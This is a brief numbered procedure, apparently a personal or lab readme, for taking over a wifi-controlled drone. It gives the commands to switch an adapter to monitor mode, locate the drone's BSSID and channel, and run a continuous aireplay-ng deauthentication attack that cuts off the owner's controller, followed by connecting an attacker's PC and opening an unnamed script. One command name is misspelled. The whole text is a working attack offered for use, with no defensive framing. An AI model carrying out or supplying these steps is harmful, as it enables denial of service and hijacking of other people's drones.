1.Open the drone
2.Insert the wifi dongle
3.change the wifi dongle mode
	#ifconfig wlan0 down
	#iwconfig wlan0 mode monitor
	#ifconfig wlan0 up
4.search the drone
	#dirodump-ng wlan0
5.write down the BSSID as X and CH number as Y
6.change your wifi dongle channel 
	#airmon-ng start wlan0 Y
7.Attack!
	#aireplay-ng -0 0 -a X wlan0 
8.after step 7, you can see the controller can't connect to the drone
9.stop DOS attack, try to use your PC to connect to the drone
10.Open the script.
